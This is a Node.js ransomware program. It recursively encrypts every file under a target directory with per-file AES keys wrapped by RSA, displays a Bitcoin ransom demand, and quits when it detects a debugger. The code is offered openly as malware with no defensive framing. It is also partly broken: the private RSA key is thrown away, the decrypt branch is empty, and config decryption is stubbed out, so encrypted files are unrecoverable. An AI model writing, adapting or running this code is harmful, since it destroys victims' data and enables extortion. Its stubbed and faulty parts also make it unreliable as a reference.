const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const log = require('simple-node-logger').createSimpleLogger('ransomware.log');

// Configuration
const CONFIG_FILE = "config.enc";
const MAX_THREADS = 8;
const AES_KEY_SIZE = 32;

// Global configuration
let config = {
    targetDir: "C:\\test",
    ransomMessage: "Your files have been encrypted. Send 0.01 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.",
    bitcoinAddress: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    encryptFlag: true
};

// Anti-debugging: Check for debugger presence
function isDebuggerPresent() {
    try {
        return process.execArgv.some(arg => arg.includes('--inspect'));
    } catch (e) {
        return false;
    }
}

// Anti-debugging: Terminate if debugger is detected
function antiDebug() {
    if (isDebuggerPresent()) {
        log.error("Debugger detected. Exiting...");
        process.exit(1);
    }
}

// Generate RSA key pair
function generateRsaKey() {
    return crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
}

// Encrypt AES key with RSA
function encryptAesKey(rsaKey, aesKey) {
    return crypto.publicEncrypt(rsaKey.publicKey, aesKey);
}

// Encrypt file using AES
function encryptFile(filepath, aesKey) {
    try {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, iv);
        const plaintext = fs.readFileSync(filepath);
        const ciphertext = Buffer.concat([cipher.update(plaintext), cipher.final()]);

        fs.writeFileSync(filepath, Buffer.concat([iv, ciphertext]));
        return true;
    } catch (e) {
        log.error(`Error encrypting ${filepath}: ${e}`);
        return false;
    }
}

// Worker thread for parallel encryption
if (!isMainThread) {
    const { filepath, rsaKey } = workerData;
    const aesKey = crypto.randomBytes(AES_KEY_SIZE);
    if (encryptFile(filepath, aesKey)) {
        const encryptedKey = encryptAesKey(rsaKey, aesKey);
        fs.writeFileSync(`${filepath}.key`, encryptedKey);
    }
    parentPort.postMessage('done');
}

// Encrypt directory recursively with multi-threading
function encryptDirectory(dirPath, rsaKey) {
    const files = [];
    function walk(dir) {
        fs.readdirSync(dir).forEach(file => {
            const filepath = path.join(dir, file);
            if (fs.statSync(filepath).isDirectory()) {
                walk(filepath);
            } else {
                files.push(filepath);
            }
        });
    }
    walk(dirPath);

    const workers = [];
    for (let i = 0; i < files.length; i += MAX_THREADS) {
        const batch = files.slice(i, i + MAX_THREADS);
        batch.forEach(filepath => {
            const worker = new Worker(__filename, { workerData: { filepath, rsaKey } });
            workers.push(worker);
        });
        workers.forEach(worker => worker.on('message', () => worker.terminate()));
    }
}

// Display ransom message
function displayRansomMessage() {
    console.log("\n\n========================================");
    console.log(config.ransomMessage);
    console.log(`Send payment to: ${config.bitcoinAddress}`);
    console.log("========================================\n\n");
}

// Load configuration from encrypted file
function loadConfig() {
    try {
        const encryptedConfig = fs.readFileSync(CONFIG_FILE);
        // Decrypt config here (omitted for brevity)
        config = JSON.parse(encryptedConfig.toString());
    } catch (e) {
        log.error(`Error loading config: ${e}`);
        process.exit(1);
    }
}

// Main function
function main() {
    antiDebug();
    loadConfig();

    const command = process.argv[2];
    if (!command) {
        console.log(`Usage: ${process.argv[1]} <encrypt|decrypt>`);
        process.exit(1);
    }

    const rsaKey = generateRsaKey();

    if (command === "encrypt") {
        encryptDirectory(config.targetDir, rsaKey);
        displayRansomMessage();
    } else if (command === "decrypt") {
        // Decryption logic here
    } else {
        console.log("Invalid command");
    }
}

if (isMainThread) {
    main();
}
